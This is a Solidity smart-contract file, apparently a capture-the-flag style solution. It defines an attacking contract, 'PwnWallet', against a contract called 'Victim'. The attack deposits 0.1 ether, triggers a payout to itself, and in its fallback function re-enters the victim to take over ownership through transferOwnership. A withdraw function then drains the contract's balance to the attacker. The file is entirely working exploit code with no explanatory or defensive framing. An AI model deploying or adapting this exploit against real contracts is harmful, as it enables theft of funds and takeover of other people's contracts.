pragma solidity ^0.4.23;

interface Victim { 
    function sendAllocation(address recipient) external;
    function allocate() external payable;
    function transferOwnership(address newOwner) external;
}

contract PwnWallet {
    address owner;
    Victim victim;
    constructor(address victim_address) public payable {
        owner = msg.sender;
        victim = Victim(victim_address);
    }
    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
    function own() public {
        require(msg.sender == owner);
        victim.allocate.value(0.1 ether)();
        victim.sendAllocation(address(this));
    }
    function() public payable {
        if (msg.sender == address(victim)) {victim.transferOwnership(owner);}
    }
}